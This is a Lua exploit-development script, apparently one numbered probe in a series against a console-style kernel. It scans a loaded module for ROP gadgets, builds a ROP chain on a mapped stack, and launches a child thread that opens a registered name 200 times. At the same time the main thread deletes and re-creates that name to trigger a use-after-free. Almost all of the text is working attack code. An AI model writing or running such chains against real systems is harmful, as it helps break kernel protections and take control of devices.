-- CRASH_CLASS: HIGH
-- PROBE 410a: open-by-name racing delete, from a native chain
--
-- 409a proved a child thread can execute a syscall sequence with per-link arguments.
-- The registry family already answers: 549 create(name, attrs, init, max), 551 open a
-- registered name (returns a new handle), 550 delete. Every one of those took a
-- reference in 341a/349c, so the interesting failure is a lookup that races the free.
--
-- One child runs 200 x 551(name) natively while the main thread deletes and re-creates
-- the name from Lua. A refcount held correctly means every open either resolves or
-- returns -1; a UAF shows as a fault, a bogus handle, or a hang. One child only: 405a
-- showed five parked children starve the loader and cannot be released.

print("=== PROBE 410a: OSEM RACE ===")

local OPENS = 200

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end

-- [A] name buffer
local name = memory.alloc(0x40)
do
    local s = "omp410a"
    local i = 1
    while i <= #s do memory.write_byte(name + i - 1, s:byte(i)); i = i + 1 end
    memory.write_byte(name + #s, 0)
end
print(string.format("[A] name=0x%X", sgn(name)))

local h0 = call(549, sgn(name), 0x100, 0, 1)
print(string.format("[A] create rv=%d", h0))
if h0 <= 0 then print("=== 410a DONE ===") return end
local probe_open = call(551, sgn(name))
print(string.format("[A] open resolves=%d", probe_open))

-- [B] gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 410a DONE ===") return end
    buf = b
end
local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] base=0x%X park=0x%X pop=0x%X gadget=0x%X", base, park, pop_rax, gadget))
if park <= 0 or pop_rax <= 0 or gadget <= 0 then print("=== 410a DONE ===") return end

local stack = call(477, 0, 0x8000, 3, 0x1002, 0xFFFFFFFF, 0)
print(string.format("[B] stack=0x%X", stack))
if stack <= 0 then print("=== 410a DONE ===") return end

-- [C] chain: OPENS x open-by-name(name), then park
local rsp = stack + 0x2000
local p = rsp
local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
wq(551)
local i = 0
while i < OPENS do
    wq(gadget)
    if i < OPENS - 1 then
        wq(pop_rax)
        wq(551)
    end
    i = i + 1
end
wq(park)

local ctx = memory.alloc(0x500)
do
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
end
memory.write_qword(ctx + 0x108, u64(0, 0x480))
memory.write_qword(ctx + 0x110, u64(0, 0x10000))
memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
memory.write_qword(ctx + 0x0f8, u64v(rsp))
memory.write_qword(ctx + 0x100, u64(0, 0x3b))
memory.write_qword(ctx + 0x048, u64v(sgn(name)))
print(string.format("[C] chain armed: %d opens, ends 0x%X", OPENS, p))

local out = memory.alloc(0x20)
memory.write_qword(out, u64(0, 0))
local trv = call(430, sgn(ctx), sgn(out), 0)
local tl = 0
do
    local tq = memory.read_qword(out)
    if type(tq) == "table" then tl = to_num(tq.l) else tl = to_num(tq) end
end
print(string.format("[C] child created rv=%d tid=0x%X", trv, tl))

-- [D] main thread races the registry while the child opens
local deleted, created, failed = 0, 0, 0
local round = 0
while round < 200 do
    local d = call(550, h0)
    if d == 0 then deleted = deleted + 1 else failed = failed + 1 end
    local h = call(549, sgn(name), 0x100, 0, 1)
    if h > 0 then h0 = h; created = created + 1 else failed = failed + 1; break end
    round = round + 1
end
print(string.format("[D] delete=%d create=%d failed=%d", deleted, created, failed))

-- [E] did the registry survive?
local after = call(551, sgn(name))
local live = call(432, sgn(out), 0)
print(string.format("[E] open after race=%d  thr_self=%d", after, live))
print("=== 410a DONE ===")
